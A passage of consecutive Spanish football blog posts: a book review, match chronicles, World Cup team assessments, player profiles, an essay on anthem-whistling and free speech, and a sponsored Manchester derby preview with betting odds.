Estarán ustedes de acuerdo en que “tocar un instrumento” constituye una actividad muy diferente de “tocar”, a secas. Mientras que lo segundo responde a una cuestión meramente sensitiva, cuando uno se enfrenta al piano, la guitarra o el arpa con la preparación adecuada, la sensibilidad golpeando y la ansiedad en las yemas, se produce algo que trasciende más allá del mero contacto entre el instrumentista y el artefacto, o entre la piel y la madera: los sonidos que rasgan corazones, una íntima comunión entre músico y oyente, y los recuerdos, reales o inventados, que evoca el mero tránsito de notas y que siempre, sin excepción, nos hacen más humanos y dotan a nuestra vida de un poco más de color. Tan diferentes son las dos acciones, que para lo primero existe un verbo aparte, quizá más preciso, sin duda más rotundo: “interpretar”. No tenemos en castellano una palabra que codifique la idea “leer sobre fútbol”, pero cuando nos enfrentamos a un texto sobre nuestro deporte favorito, y la cosa marcha, lo que percibimos –y sentimos- en medio de la vorágine lectora dista mucho de lo que puede ofrecernos cualquier novela común. Basta con que se nombre un partido que hemos visto para que la imaginación viaje no sólo al partido, sino a los amigos con quienes lo compartimos, las lágrimas o risas que surgieron tras el lance definitivo, o incluso la rubia, allí al fondo del bar, a la que guiñábamos el ojo entre saque y saque de puerta. El cóctel de memoria compartida, ilusiones de grandeza y momentos irrepetibles que evocan estos tipos vestidos de corto es dinamita emocional, y cuando abrimos el libro con el balón en la portada –siempre hay alguno, compruébenlo- sabemos que de él pueden salir dardos que incendien dentro de nosotros regiones que ni conocíamos. Abismos de la memoria y el sentimiento que la mayor parte de las novelas convencionales ni siquiera sueñan con rozar.Sin embargo, como siempre que se manipula material sensible, el autor del libro de fútbol debe ser muy cuidadoso. Basta un poco de sesgo medio malintencionado –o ni siquiera eso- en un sentido o en otro para que un mundo de lectores se sienta dolido, ofendido y, a menudo, incluso ultrajado; este tipo de persona no sólo declarará que el libro es una bazofia, sino que hará campaña activa contra él y, si se lo permites, te lo arrancará de las manos y lo lanzará a la hoguera cual Savonarola hooligan. Sin llegar a esos extremos, si el manuscrito anda lleno de obviedades y tópicos, se descartará sin piedad por vulgar e inane; y si en lo que consiste es un listado o aglomeración sucinta de situaciones, anécdotas o historias más o menos conocidas, los recuerdos que evoque en el lector andarán ya manidos, desprovistos de encanto por la repetición, y el libro, si es que se termina alguna vez, caerá rápido en el olvido.Quizá no de modo tan explícito, pero todas las ideas anteriores anidaron en la cabeza el arriba firmante cuando tuvo noticia de que el compañero Miguel Gutiérrez escribía un libro cuyo hilo conductor serían frases futboleras. Fundador de éste y otros blogs relacionados con el deporte y pionero en España en la dignificación consciente de la relación entre literatura y fútbol –especialmente a través de Internet- era cuestión de tiempo que alguien confiara en él y le abriera la puerta de toriles que conduce al ruedo de la letra impresa. El desafío era notable, y si bien el conocimiento del sujeto descartaba que el asunto fuera tratado con forofismo, y a la vez garantizaba la saludable distancia que suele ser su marca de fábrica, no excluía la aridez que suele acompañar a los libros cuyo subsuelo es un listado, y que exigen, por tanto, un tratamiento especialmente delicado del contexto. Asimismo, se corría el riesgo ya explicado de que el afán de totalidad obligase a incluir demasiado material excesivamente conocido, y que el folklore acabase llevando el libro al terreno de lo prescindible.Devorado el libro en las pocas horas que una primera lectura exige –vendrán más- podemos afirmar que el autor ha logrado sortear las dificultades mencionadas trascendiendo el clásico concepto de envoltorio de frases de dos maneras diferentes. En primer lugar, las frases constituyen el armazón sobre el que se sustenta el libro, pero el fin último de éste pasa a ser la descripción de personajes y situaciones que las han generado a puñados. Así, el libro se convierte en una sucesión de semblanzas, tan vivas como documentadas, de algunos de los tipos alrededor de los cuales se han vertebrado más de cien años de fútbol. Nombres inevitables como Maradona o Cruyff conviven junto a otros menos evidentes como Vinnie Jones, Shankly o Toshack, y en todos ellos se busca, siempre a través de sus frases o las de sus coetáneos, a la persona que habita detrás del tópico que todos repetimos, y la historieta reveladora y oculta más que la ampliamente conocida. La técnica alcanza su cenit en la descripción de la pugna Menotti–Bilardo, quince páginas de duelo a fuego lento que podría haber firmado Sergio Leone.En cuanto a la segunda dificultad, el demencial fondo de armario de frases de fútbol con el que uno puede encontrarse en cuanto investiga un poco, el principio es tajante: un libro se hace tanto con lo que se deja como con lo que se mete, y muchas frases quedan fuera por imposibles de encajar en la estructura general. Una filosofía que desagradará a los amantes de lo exhaustivo, que los hay, pero que agradece la obra, aligerada de un lastre que no le corresponde. Unas pocas páginas de miscelánea al final nos señalan lo que podría ser todo el libro si se hubiera estructurado de ese modo; está bien cerrar un gran banquete con un pastel de tiramisú, pero si la comida hubiese consistido en cinco kilos de dulzaina, poca gente se lo hubiera acabado. Y estarían en el servicio.No es el caso. Miguel Gutiérrez ha logrado ese milagro de tan rara consecución, que la digestión sea tan sencilla como enriquecedor el contenido. El profano encontrará en su libro una deliciosa historia del fútbol de bolsillo a través de los bocazas que lo han ido llenando de picante, mientras que los que nos consideramos futboleros sacaremos de ellas un puñado de historias que seguramente no conocíamos, y unos perfiles que dibuja mejor que nunca una de las plumas más afiladas que diariamente escriben sobre fútbol en España. Una novedad refrescante hoy, pues, y una referencia estándar mañana. Imprescindible. No fue bueno el resultado ayer para el Madrid, pero gracias a los amigos de Heineken el compañero Juan P. Nonay, de Café Fútbol, y el arriba firmante pudieron disfrutar desde una posición privilegiada de uno de los mayores espectáculos que ofrecer el balompié mundial. Un comienzo litúrgico, con el Bernabéu repleto invocando viejos ídolos, el himno de la Champions League atronando y una pancarta en el fondo alemán que resultó profética: “La bestia negra”. El partido se abrió con un grito de guerra bramado desde la grada, y se cerró con el rugido de miles de gargantas teutonas llevadas al éxtasis por el zapatazo postrero de Schweinsteiger. En el medio, una celebración catártica de intensidad, alegría y miedo, la historia del fútbol europeo saltando chispas en cada pugna, y un espectáculo maravilloso que no debería perderse ningún aficionado al fútbol. España. Campeón del mundo. Seis victorias y una derrota, con ocho goles a favor y dos en contra. Goleadores: Villa (5), Iniesta (2) y Puyol.Lo mejor: la fidelidad a un estilo vistoso, la fiera competitividad que permitió paciencia con el 0-0 y aguantar victorias mínimas, y la capacidad de Del Bosque para cambiar desde el banquillo el signo de los partidos.Lo peor: la preocupante ratio entre ocasiones de gol generadas y transformadas, cierto sufrimiento ante los equipos que presionaban muy arriba, y la actuación de Torres.La estrella: aunque gente como Puyol, Ramos, Casillas o Villa rayaron a gran altura, hay que quedarse con Andrés Iniesta, motor del juego ofensivo español –especialmente en la segunda fase- y el mejor en los momentos más dificíles de la finalísima.El momento: sin ninguna duda, el minuto 116 de la prórroga en Johannesburgo. El gol de nuestras vidas.Chile. Octavos de final. Dos victorias y dos derrotas, tres goles a favor y cinco en contra. Goleadores: Beausejour, Mark González y Millar.Lo mejor: la capacidad para desarrollar como un solo hombre la exigente idea de fútbol de Marcelo Bielsa, y el descaro mostrado ante selecciones superiores.Lo peor: poca capacidad realizadora, y el hecho de que la naturaleza de su juego, duro pero no violento, provocó que el equipo se cargase con demasiadas tarjetas.La estrella: aunque individualista en bastante ocasiones, Alexis Sánchez se erigió en el mayor generador de peligro de los andinos.El momento: quizá, en un partido que los chilenos tenían bastante controlado, el testarazo de Juan que adelantó a Brasil. Y es que aunque no siempre relevante, el físico también es un valor en este juego.Suiza. Eliminada en la primera fase. Una victoria, un empate y una derrota, un gol a favor y uno en contra. Goleador: Gelson Fernandes.Lo mejor: la perfecta interiorización del sistema defensivo, que desesperó a España y llevó al límite la resistencia en inferioridad ante Chile.Lo peor: escasísima creatividad atacante y, a diferencia del equipo de Kobi Kuhn, desprecio al juego combinativo. Lo pagaron contra Honduras.La estrella: sorprendió la verticalidad del joven Eren Derdiyok, que hizo olvidar a un Frei que ya viene de vuelta.El momento: la jugada trabucada y confusa que les acabó dando la victoria ante España, además de convertirles en sensación momentánea del torneo.Honduras.Eliminada en la primera fase. Un partido empatado y dos perdidos, ningún gol a favor y tres en contra.Lo mejor: haberse desenvuelto con bastante dignidad con una de las plantillas más débiles del torneo. Estar en Sudáfrica ya era un regalo para ellos.Lo peor: no haber sido capaz de anotar al menos un tanto, única selección en el Mundial que quedó con el casillero a cero, junto a Argelia.La estrella: Wilson Palacios mostró en la zona ancha y la misma consistencia y criterio con los que se desenvuelve en White Hart Lane.El momento: quizá un falta dudosa sobre Edgar Álvarez en el borde mismo del área hubiera cambiado el rumbo de su partido inicial, pero la verdad es que pocos momentos brillantes firmaron los centroamericanos. El Madrid ha despachado hoy con cierta saña (7-0) a un Màlaga repleto de suplentes habituales –no se quejará Mourinho– que ha ofrecido una resistencia nimia y seguramente ha sido el rival más flojo que ha enfrentado el equipo blanco en la presente Liga. Los andaluces ni han creado juego ni han defendido con determinación, y al Madrid le han bastado su capacidad de robo de balón, las transiciones fulgurantes y algunas brillantes combinaciones en ataque para alcanzar un resultado escandaloso. Rompió el fuego Benzema con un buen remate a balón parado, asentó el resultado Di María con un brillante contragolpe en el que lo elegante hubiera sido darle el balón a Özil, y luego han llegado un empalme de Marcelo, el doblete de Karim y el hatrick que suele anotar Cristiano Ronaldo en estos casos. Para la pequeña historia queda que el Màlaga quedó con nueve por expulsión de Gaspar y lesión de Cala, que Cristiano se retiró voluntariamente con molestias cuando ya no quedaban cambios, y que Canales disfrutó de la media hora final. Al menos, en el Bernabéu ya saben que es rubio. El rugido de la bestia… Minuto noventa y muchísimos. El equipo de las franjas azules empata en casa, un 2-2 que le sirve de bien poco, a pesar de que satisfaga al espectador neutral. Se acerca volando el balón, más alto que bajo, más fuerte que lento. Y el futbolista de ébano, coordinado como un bailarín a pesar del armazón de adamantium, se eleva al cielo mediterráneo para alcanzar el remate invertido, irrechazable, imparable. Uno de esos momentos que aseguran cinco segundos de silencio antes de que griten gol hasta las plantas de los pies. Elijan ustedes, Julio… o Vitor. …y los gritos de los bestias. Durante años, el Atlético de Madrid ha podido resumirse en dos jugadorazos en la vanguardia y una serie de individuos por detrás que oscilaban aleatoriamente entre lo discreto y la barraca de feria. Un equipo sin rumbo, agarrado a sus estrellas, que se debatía entre los nervios de su afición y la cada vez más acusada indiferencia de los neutrales. Sin embargo este año, por primera vez en muchos, el Atleti ha construido un equipo simpático y alegre, bien estructurado, que apetece ver: Falcao es el hombre del momento, Arda una culebra de las que levantan al respetable, y Diego el mago que, en forma, puede invocar a los astros del fútbol. Por esto, porque es un buen momento para difundir la imagen del club y para que los zagales vuelvan a pedirle a sus padres que le compren la zamarra del oso y el madroño, sería interesante que alguien de dentro saltara para señalar a los repugnantes subnormales que anoche en la grada se reían de un muerto. Porque hoy, la noticia es ésa, y no fueron dos ni tres.El derby del obús. Pudo ser el partido que marque el punto de inflexión en la trayectoria vasca del Loco Bielsa; quizá un punto de la suerte que le venía siendo esquiva, otro poco de ser flexible para asumir en su ideario que el balón largo no tiene por qué ser un estigma ni un recurso leproso, y un par de toques del bailarín Llorente, por fin protagonista, para una victoria crucial y un monstruoso suspiro de alivio en Ibaigane. Pudo ser todo eso, pero al cabo de los años de lo que nos acordaremos será del Pershing tierra-tierra de Íñigo Martínez. Arte minimalista asociado a un relámpago.Palos, astillas, castas y galgos. Los que andamos ya por la treintena llevamos clavados algunos partidos de Iomar de Nascimento, Mazinho para los amigos, en zonas de la memoria donde se entremezclan museos, paisajes y alguna que otra balada de Nico. Con la herencia paterna en los borceguíes y la materna en el apellido, Thiago sería capaz de realizar el remate del escorpión sin ensuciarse ni una rodilla.Melena y barba desbarajustadas, arriba hay un puño cerrado, de peón, para saludar a la grada del viejo estadio de Santa Giuliana. El que tras fichar de salida en la Fiat no pierde un segundo y esprinta hacia las reuniones del sindicato es el mismo que emboca la pelotita cada domingo para que su equipo pueda asomarse por primera vez a la Serie A. Ese barbas que trabaja el gol en el Perugia 74 es una anómalía a todas luces. Como muchos jóvenes de la época calza a la izquierda, sí, pero siendo futbolista jamás lo oculta y acaba convirtiéndose en la excepción del gremio. Cromo indeleble con alquiler vitalicio en la memoria italiana, pasea enfundado en la roja del Perugia Paolo Sollier, mediapunta y militante.Poco más que un currante del infrafútbol, un número trajinando en la C para la Pro Vercelli y la Cossatese alcanza fama cuando asciende con el Perugia y pone la primera piedra del equipo que asombraría a Italia años más tarde rozando el scudetto. No era un prodigio depositándola contra la malla pero cuando buscas material suyo y encuentras únicamente entrevistas atentas a su circunstancia política intuyes la clase de icono que tienes enfrente. A continuación miras la imagen del universitario Sollier, bolso a cuestas con los apuntes de Ciencias Políticas y Leyes, posando para la prensa mientras ojea Il Manifesto y acabas por entenderlo. “Siempre trabajé de peón y como futbolista. Entraba en el vestuario, me ponía la camiseta y las botas y entraba en otro mundo. El día a día quedaba fuera. Luego me volvía a cambiar, me despedía de todos y volvía a mi vida. Comencé a realizar trabajos sociales en mi barrio, la Vanchiglia (entonces zona obrera en Turín) en una organización católica llamada Manai Tese. Éramos voluntarios. Al crecer me fuy acercando a la izquierda y a la democracia proletaria”. Al aparato Sollier, incluso durante su breve etapa como jugador de Primera miembro activo de la Avanguardia Operaia, la organización obrera de extrema izquierda nacida de la efervescencia del 68. Su diferencia. “Había pocos jugadores que quisieran hablar de política. De los grandes de la época tan solo Gianni Rivera mostró cierto interés por lo que estaba sucediendo, su actividad tras dejar el fútbol (Rivera activo en política desde 1987 al punto de llegar a eurodiputado) demuestra que tenía buena cabeza. Del resto, ninguna noticia”. Al hilo, la rareza de Sollier fue que se mantuvo en sus trece aun cuando saltó a la fama. Mientras otros acarician el volante del último BMW este seguía viviendo en una casa modesta, alejada del centro histórico de Perugia y forrada de propaganda política.Decía Sollier que no se consideraba diferente al resto tan solo porque los aficionados le idolatrasen (a la izquierda de Dios solían cantarle) y que sus intereses en la vida, su pasión era la fotografía, no terminaban en el fútbol. Quizá por ello se hartó fútbol de élite a las primeras de cambio y tras solo una temporada en primera regresó a la B con el Rimini y de nuevo al comienzo del círculo con la Pro Vercelli y la Cossatese. A la C y más abajo. Un romántico, abogó por una visión social del deporte  alejado de los disparates del profesionalismo y lleva más de treinta años denunciando los excesos del tifo y el divismo de sus compañeros de profesión. Por todo ello, por tener voz propia en un mundo que acostumbra a acogotar al que tiene algo en la mollera, merece el aplauso. Tan fuerte como el que le brindaba la curva perugina cuando marcaba y alzaba el puño. Italia, donde la patada es arte y el 0-0 un accidente que no incomoda, siempre ha sido buena fabricando goleadores veteranos. Cosas de la aclimatación. En ese club de pistoleros otoñales se toman un café el sábado por la tarde Di Natale, Hübner, Bierhoff o Pruzzo por citar solo unos cuantos que acabaron marcando más que nadie superada la treintena. Y de vez en cuando se acerca por allí, a contar unos chistes, un tipo enorme con la cara dotada para la comedia a lo Vittorio Gassman y un olfato que se resiste a caducar. Se llama Luca Toni y ayer puso a Verona en pie con dos cabezazos al Milan (nada menos) que amarraron la victoria del club en su regreso a la Serie A tras una década de infrafútbol. Cuando acabó el partido, Toni comentó la jugada con su proverbial gracejo. “Los dos goles son para mi mujer Marta y mi hija Bianca, no he marcado el tercero porque no sabría a quién dedicárselo” Hay cosas que nunca cambian.Con 256 goles en la mochila (111 en la A) y 36 años en las piernas, Toni ya ha escrito todo lo bueno que tenía por escribir.A propósito del Oporto-Atlético de Madrid que hoy se disputa en Portugal, el entrenador local hizo una reflexión sobre el rival que me llamó la atención. Dice Fonseca que el Atleti es “un equipo italiano que juega en España”. He pensado mucho sobre su afirmación. Se me estropeó la lavadora y tuve que dejar de pensar en ello. Pero ahora vuelvo a sentarme delante del ordenador con su idea en la cabeza. Estas afirmaciones categóricas, casi aforísticas, siempre tienen trampa. Desconfiad de las personas que hablan sentenciosamente, algo esconden, posiblemente desconocimiento. Pero le doy a Fonseca el beneficio de la duda. Cierto es que equipos italianos eran la Roma de Spalleti, el Inter de Mourinho y el Milan de Sacchi. Y claro, por poner tres ejemplos con intención, ninguno tiene nada que ver con el otro. Seguimos buscando.A lo mejor se refiere Fonseca al tópico italiano. Busco la literalidad de su afirmación y por ahí van los tiros. Dice que el Atlético “defiende con bloque bajo y sale rápido al contraataque”.Confieso mi desconocimiento del significado de “bloque bajo”. No soy un analista del juego –hay muchos blogs especializados que recomiendo-. Entiendo que la organización en bloque bajo es esa retaguardia que juega al borde del área, compactada con el portero, zonal y a la expectativa del ataque profundo del rival. Puede ser cualquier otra cosa, pero lo entiendo así. Desde luego hay equipos italianos que juegan de esa forma. También belgas, escoceses y checos, pero es una idea unida al conservador juego italiano. Nos movemos en el tópico, lo sé.Centrémonos pues en esa idea. El Atlético juega compactado. No diría que su juego se basa en el contraataque. Si tuviera que definirlo, sin duda, diría que su verdadera virtud es un centro del campo que achucha y toca a partes iguales. Así se comió al Madrid el otro día en el que fue el partido más elaborado de lo que lleva de temporada. Tiene una salida rápida, y tiene un delantero pivote en racha como es Diego Costa. Cuando digo pivote es elaborador, que va al desmarque pero también apoya la incorporación de un centro del campo que está en un momento dulce. Un tipo para todo que además remata con intención. Carne de ídolo.Sigo dándole la vuelta a las palabras de Fonseca. ¿Qué es un equipo italiano? Ahondemos en el tópico, tormenta de ideas: equipo luchador, con tendencia a cerrarse, que mata el partido a la contra, con delantero centro fijo y matador, bueno en la especulación, con tendencia a interrumpir la creación del contrario, con querencia a la pérdida de tiempo y el juego al filo del reglamento. Pero este Atlético es mucho más: tiene laterales con una capacidad ofensiva innegable, tiene un centro del campo imaginativo, y sobre todo tiene a Simeone.Como entrenador sólo pasó por el Catania y apenas hizo nada. Como jugador se tiró muchos años en el país transalpino en las ciudades de Pisa, Milán y Roma. Algo sacaría del fútbol de allí. Su juego, su centrocampismo avasallador tiene reflejo en el juego de Mario y Koke. Recuerdo su época en el Sevilla sobre todo, cómo llenaba el campo y lo duro que era. No digo violento, digo duro, concentrado, expeditivo. A veces sucio, pero no perdura en mí ese recuerdo. Es otra cosa, es como un tipo contra el que no querrías jugar. Entiendo que como entrenador transmite cosas así. El Atlético me parece un equipo corajudo y fuerte. Veo la proporcionalidad entre entrenador y plantilla, veo el calco.Quizá a eso se refiera Fonseca. A que si el Atlético fuera un jugador ese sería Simeone. Y lo pienso en Italia, en aquella Lazio de Simeone, Verón, Stánkovic, Nedved… y no logra imponerse la idea de un equipo conservador, italiano, sino algo más imaginativo, abierto, impredecible. Como este Atlético quizá. Pero quién sabe lo que quiere decir Fonseca. Y quien soy yo para remover de nuestro cerebro un tópico tan socorrido como éste. Libertad de ExpresiónLa libertad de expresión se ha convertido en un instrumento para los ofendidos. El derecho, brutal y disputado, de expresar lo que a uno le venga en gana lleva años chocando con el derecho, pueril y afectado, del que se siente dolido por las ideas de los demás. La ideología como campo de batalla. De siempre. O peor aún, en la finísima piel. En la indignación que esconde la falta de argumentos. En poner en el grito en el cielo en contra de los demás por la incapacidad de poner el grito en el cielo con los argumentos propios. Creo que el “honor” del pueblo siempre ha sido, en nuestra democracia, el juguete de los mojigatos y los ociosos.Como español que soy no me siento ofendido porque se pite ese horroroso himno que tenemos. Ni siquiera si queman la bandera roja y gualda. No me afectan en el honor las ansias independentistas siempre y cuando vengan como opción política, o acompañadas de colgar banderas en los balcones, argumentos culturales más o menos rigurosos o simplemente cálculo económico. El único límite es el propio ser humano y nuestra Constitución. Matar en nombre de la autodeterminación, por ejemplo, no es ni debatible en un Estado democrático. Tampoco los chantajes monetarios, las iniciativas inconstitucionales o la desestabilización política del sistema. Eso no quita que respete y entienda a los que conciban los himnos, las banderas, las txapelas o las barretinas como alegorías de su propia identidad. Para esos, el límite no es el derecho, sino la pura deferencia. La diferenciaQue en un Barcelona-Athletic en campo catalán se pite el himno español me parece, hasta cierto punto, asumible. El himno es un símbolo de la patria, y la patria es un concepto arcaico y tan nacionalista como los propios silbos del sábado. Hay una lucha de identidades que afortunadamente se está dirimiendo donde debe dirimirse: en los parlamentos y en las urnas. El resto es un pulso estético. Cuestionar al Estado español en un campo de fútbol no es diferente de cuestionarlo en una sala de exposiciones, en una obra de teatro o en un periódico. Allá donde hay gente hay ideología, y allá donde hay ideologías hay pluralismo, y allá donde hay pluralismo hay libertad de expresión.Quizá aún no es decisivo, pero el toque de balón del chaval –preciso es poco- su regate seco y sobre todo esa elegancia que sugiere fraques y smokings, tardes en el Prater y  vestidos vaporosos entre fusas de Strauss, hablan de un placer visual que nos va a durar muchas temporadas. Lo más hermoso del Molinón lo brindó él.La roca necesaria. Suele ser su pareja de baile la que se lleva todos los elogios: Javi Márquez es el cerebro, Javi Márquez es un mediocentro de manual, Javi Márquez es la joya del Español. Pero anoche, si las bestias blancas no se desbocaron hasta pasada la hora larga de juego, fue por su actividad enloquecida, esa que a veces se llama oscura y siempre resulta imprescindible: Raúl Baena se multiplicó, cerró huecos, tocó banda, olió área propia y ajena, y entre el tackle y el despeje emborronó la buena puesta en escena del Madrid y habilitó a su gente para que un rato largo se soñara en Cornellá con el empate. Curtido a sus 22 años como la piel de un toro, regresa este año de un infierno de lesiones, y sólo algún club avispado con mandanga en el banco podrá impedir que en unos años luzca orgulloso el brazalete con la cuatribarrada.Peckinpah en Valencia. El compañero Ballester los llamó el año pasado La pandilla salvaje: sin recuerdos, sin esperanzas, sin mirar atrás. Unos tipos vestidos de azulgrana que no gastan el glamour de los Messi o Xavi o Iniesta, que no verán el Balón de Oro más que en los periódicos, ni tocarán más copas que las que les sirvan en cualquier bar de Els Orriols acabado ya el partido. Fueron llegando estos últimos años a un club desahuciado, ninguneados en equipos mejores, con un hermoso pasado a cuestas y una sombra negra en el horizonte donde se dibujaba la retirada. Quizá su salvación fue lo más emotivo del pasado año; ayer fueron líderes, y hoy podrán presumir de ellos ante sus hijos, que ya no son bebés precisamente. Honor y gloria. Nadie lo hubiera dicho hace unos meses, tampoco hace unas semanas, pero existe la probabilidad de que, entre las grandes ligas, ninguna depare un desenlace tan agónico como la Premier League. En el derby de derbies de Manchester -130 años los contemplan- City y United se jugarán un título que en algunos momentos pareció asegurado para la vitrina de los dos contendientes, y que a día de hoy presenta un futuro más incierto que cualquiera de los principales torneos europeos: el Dortmund ya es campeón, y tanto Madrid como Juventus están a un dedo del título.Probablemente, el Manchester United sigue siendo el favorito para alzarse con el trofeo que patrocina Barclays. En primer lugar, por los tres puntos de ventaja que disfruta sobre su rival, y que convierte en tolerable para ellos cualquier resultado que no sea una derrota. No es mal punto de partida. Además, el calendario que espera a los diablos rojos es bastante más benigno, por cuanto que se enfrentarán a Swansea y Sunderland, equipos con los deberes hecho que no se juegan nada; el City, en cambio, deberá visitar St. James Park para visitar a un Newcastle que está disputando un puesto de Champions League –aunque no está tan fino como hace unas semanas- y acaba la temporada en casa ante el QPR, al que ayer humillaron en Chelsea (6-1, hat-trick de Torres) y que estará luchando desesperadamente por salvarse. Todo bastante claro, si no fuera porque estos razonamientos se hacían semanas atrás, cuando el United llevaba ocho puntos de ventaja, y nadie pensaba que los de Ferguson fueran a caer en Wigan ni a a ceder un empate cuando vencían 4-2 al Everton a cuatro puntos del final.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Al otro lado de la ciudad se disfruta del buen ambiente propio del que viene remontando. Después de que Mancini marginara a Tévez a principios de curso por aproximadamente la décima parte de lo que ha hecho Balotelli esta temporada, y lo readmitiera soga al cuello hace poco en una histórica bajada de pantalones, las declaraciones recientes de los dos protagonistas parecen sugerir un próximo matrimonio. El Apache ha vuelto como lo que es, un futbolista descomunal, y amenaza con convertirse en el factor diferencial que acabe entregando al City su primera liga en más de cuarenta años. Con el pistón bajado desde hace tiempo después de un fantástico invierno, en una competición que se les ha hecho larguísima, los celestes confían también en el repunte en los últimos partidos de Silva y Agüero de cara al arreón final. Los dos pequeños genios comenzaron el curso asombrando al mundo, pero han notado los partidos y llevan meses a medio gas. De cómo respondan en este envite final dependerá en gran parte el destino de la competición.En cualquier caso, sea quien sea el campeón, no ocultará el descenso del nivel de juego de la competición, y en particular de los dos gigantes. El United apenas ha brindado un puñado de partidos decentes, mientras que el City ha alternado goleadas con partidos de nivel ínfimo y defensas cavernarias que han desencadenado las habituales críticas sobre Mancini. Para cualquiera que los haya seguido durante el año no resultan grandes sorpresas sus eliminaciones sucesivas de la Champions y la Europa League, porque la realidad es que han resultado dos escuadras muy poco fiables durante el año. Esperemos que se eleve el listón la próxima temporada.Tenemos hoy un partido realmente delicado para apostar, pero que precisamente por ello puede aportar bastantes beneficios. En bwin.com se paga a 2.20 la victoria local, a 3.30 el empate y a 3.30 el triunfo del United. Si alguien cree que se repetirá el festival de goles de la ida, debe saber que el over 3 se paga a 2.60, mientras para los que apuesten por un partido controlado y defensivo, la cuota de apuestas de 2.10 a menos de tres goles puede ser muy interesante. Las cuotas de gol también son muy interesantes: 2.40 para Agüero, lo mismo para Rooney, 2.50 para Tévez, que pasan a ser de 6.00, 6.00 y 6.50 si hablamos del tanto que abre el marcador. Hagan juego. Como cada lunes, servidor seguía anoche Fiebre Maldini cuando, casi sin previo aviso, apareció una exhibición de goles de Bergkamp. A pesar de haber visto ya muchos de ellos –algunos incluso repasados en antiguas noches de adolescencia-, a pesar de recordar como si fuera ayer aquella temporada en que escuchar su nombre era sinónimo de imposible, a pesar del conocimiento, la edad y el fútbol ya visto, el torrente de belleza resultó casi tan perturbador como insoportable. Notando la mandíbula caer una y otra vez, el raciocinio imposibilitado para entender cómo podían acumularse tantos recursos y tanta magia en un sólo futbolista, y abrumado por un festival donde lo excepcional se aliaba de vez en cuando con lo imposible –vean 2:10 en el vídeo adjunto y consideren si exagero- pensé que no habría mejor modo de decirle welcome a la primavera que recordar de lo que era capaz este individuo blanco y rubio como la cerveza; una exhibición que sirve a la vez como definición del síndrome de Stendhal, y de explicación de por qué hubo un tiempo en el que Arsène Wenger sí ganaba títulos. De francés a francés, pasando por Flandes. Parecía paradójico que la afición de una selección con el currículo de Alemania celebrara con alegría desbordada y sincera un simple tercer puesto, sobre todo después de la ilusión depositada en la final de Berlín y el factor campo del que disfrutó en el Mundial 2006. Cayeron los de Klinsmann en aquella prórroga frente a Italia que ha quedado como gran recuerdo del campeonato, pero la imagen dada de equipo joven y en crecimiento, querencia por el balón y, por fin, un toque estético que raramente se había asociado antes con la Mannschaft, se ganaron el corazón de su gente y la esperanza en un futuro que sólo unos años antes pintaba muy oscuro.Aquel día los jugadores prometieron que volverían cuatro años después a Berlín con el trofeo, y si bien el juego ha devenido más práctico que romántico en los últimos tiempos, no puede negarse que este periodo ha supuesto una etapa de crecimiento para los germanos. La línea de continuidad que supuso el nombramiento de Löw y su concepto rabiosamente moderno de la preparación, junto con un aprovechamiento modélico de los jóvenes que van saliendo en las selecciones inferiores y una línea de juego muy clara han engendrado un conjunto agradablemente mestizo, con inventiva y cuerpo, competitivo y alegre. Una agradable invención, quizá la única posible en la Alemania pluricultural de 2010, muy alejada del prototipo panzer que ha granjeado tantos éxitos como antipatías la fútbol teutón.La fase de clasificación, a la que Alemania se presentaba tras el subcampeonato conseguido en la inolvidable final contra España, les enfrentaba a la temible Rusia de Hiddink y a un pelotón de cenicientas donde sólo Finlandia ofrecía ciertas garantías. Un grupo sencillo, por tanto, que resolvieron los germanos de modo administrativo, sin gran brillantez pero también sin conocer la derrota en los diez partidos. Un par de extraños empates ante Finlandia, las palizas de rigor a Liechtenstein para animar al personal y, como highlight, la doble victoria ante Rusia que aseguraba el primer puesto a la vez que llenaba a la gente de confianza; algo natural, dada la sencillez con la que la selección acabó convirtiendo la clasificación en un trámite.Sin embargo, el optimismo general ha quedado algo rebajado por la serie de reveses que ha sufrido el equipo, especialmente en los últimos tiempos. El primer problema está en la portería: tras el triste fallecimiento de Enke en un momento en el que se estaba ganando el puesto, la lesión en las costillas de René Adler –seguramente el mejor portero del país- deja el marco huérfano de guardametas de garantías. A nivel mediático ha llenado páginas la baja del capitán Ballack, quizá más importante por su experiencia que por su estado de forma actual, pero es posible que golpeen más al equipo las del medio Simon Rolfes, ancla en el centro, y sobre todo la del bravo lateral del Schalke Heiko Westermann, jugador infravalorado donde los haya. En cualquier caso, Löw sigue teniendo mimbres para montar un once de garantías, y nadie duda de al menos su clasificación para octavos en un grupo bastante complicado. Con el veteranísimo Butt partiendo con ventaja para la portería tras una buena temporada, el equipo se articula alrededor del poderío de Lahm como carrilero, la consistencia en la zona ancha de Khedira y un Schweinsteiger venido a menos, la clase del ligero Özil, la frescura de Müller y el martillo arriba que representará más posiblemente Klose que su compañero Mario Gómez, algo marginado en el Bayern esta temporada. Habrá que estar atentos también a Toni Kroos, un jugador especial a quien el campeonato le llega un poco pronto, al desparpajo de Marko Marin y a la electricidad de Podolski cuando se enfunda la camiseta blanca. Con estos jugadores, los germanos esperan volver al lugar que les corresponde por historia y potencial, y también reflejar el renacimiento de un fútbol que ya ha reflejado una Bundesliga que acaba de superar en ingresos a la Premier, y que ha colocado a un equipo en la final de la Champions y a otro en semifinales de la Europa League.Lo mejor: la confianza y el cariño que genera esta selección, y la profusión de jóvenes promesas a punto de dar el salto.Lo peor: las dudas en la portería y las ausencias, respectivamente, de un crack y un líder.Jugador a seguir: Mesut Özil. Mediapunta zurdo que al fin ha explotado en el Werder Bremen, reúne las mejores condiciones para jugar en su puesto, aunque le penaliza un poco su irregularidad.Pronóstico DDF: Cuartos de final al menos –aunque presumiblemente le aguarde un choque duro en octavos-, no sería extraño verlos en la zona más noble del palmarés. Representante de una estirpe que siempre está a punto de extinguirse y nunca lo hará, porque mientras haya porterías existirán los que sólo piensan en ellas, Mario Gómez se presenta esta noche bajo los focos de la Champions League como el goleador más en forma del continente, y ojo que gente como Rooney, Kun Agüero o Cristiano ha empezado el curso con la metralleta en la mano. Nadie incluye a Super Mario en las listas de las mejores delanteros del mundo, a pesar de firmar el año pasado una media de casi gol por partido, y su explosión definitiva aparece algo silenciada por esa selección alemana ágil y pinturera, tan diferente, que encandila al espectador neutral como quizá nunca lo hizo el equipo de la doble águila.Entre tanto estilista de pie delicado y cintura de anguila que habita en la corte de Joachim Löw-hablemos de Özil, de Müller, de Götze o de Marin– Mario Gómez resulta lo más parecido a un alienígena, un 